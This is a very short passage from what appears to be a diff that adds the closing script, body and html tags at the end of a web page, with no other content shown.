+  </script>
+</body>
+
+</html>
